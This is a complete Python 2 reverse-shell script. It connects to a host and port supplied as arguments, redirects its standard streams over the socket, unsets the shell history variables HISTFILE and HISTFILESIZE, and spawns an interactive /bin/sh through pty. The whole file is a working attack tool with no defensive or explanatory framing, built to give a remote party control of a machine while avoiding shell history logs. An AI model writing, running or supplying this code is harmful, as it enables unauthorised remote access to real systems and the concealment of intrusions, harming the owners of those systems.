#!/usr/bin/python

import sys
import os
import socket
import pty

shell = "/bin/sh"

def usage(programname):
	print "Usage: %s host port" % programname
	
def main():
	if len(sys.argv) !=3:
		usage(sys.argv[0])
		sys.exit(1)
	s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
	try:
		s.connect((socket.gethostbyname(sys.argv[1]),int(sys.argv[2])))
		print "[+]Connect OK."
	except:
		print "[-]Can't connect"
		sys.exit(2)
		
	os.dup2(s.fileno(),0)
	os.dup2(s.fileno(),1)
	os.dup2(s.fileno(),2)
	global shell
	os.unsetenv("HISTFILE")
	os.unsetenv("HISTFILESIZE")
	pty.spawn(shell)
	s.close()
	
if __name__ == "__main__":
	main()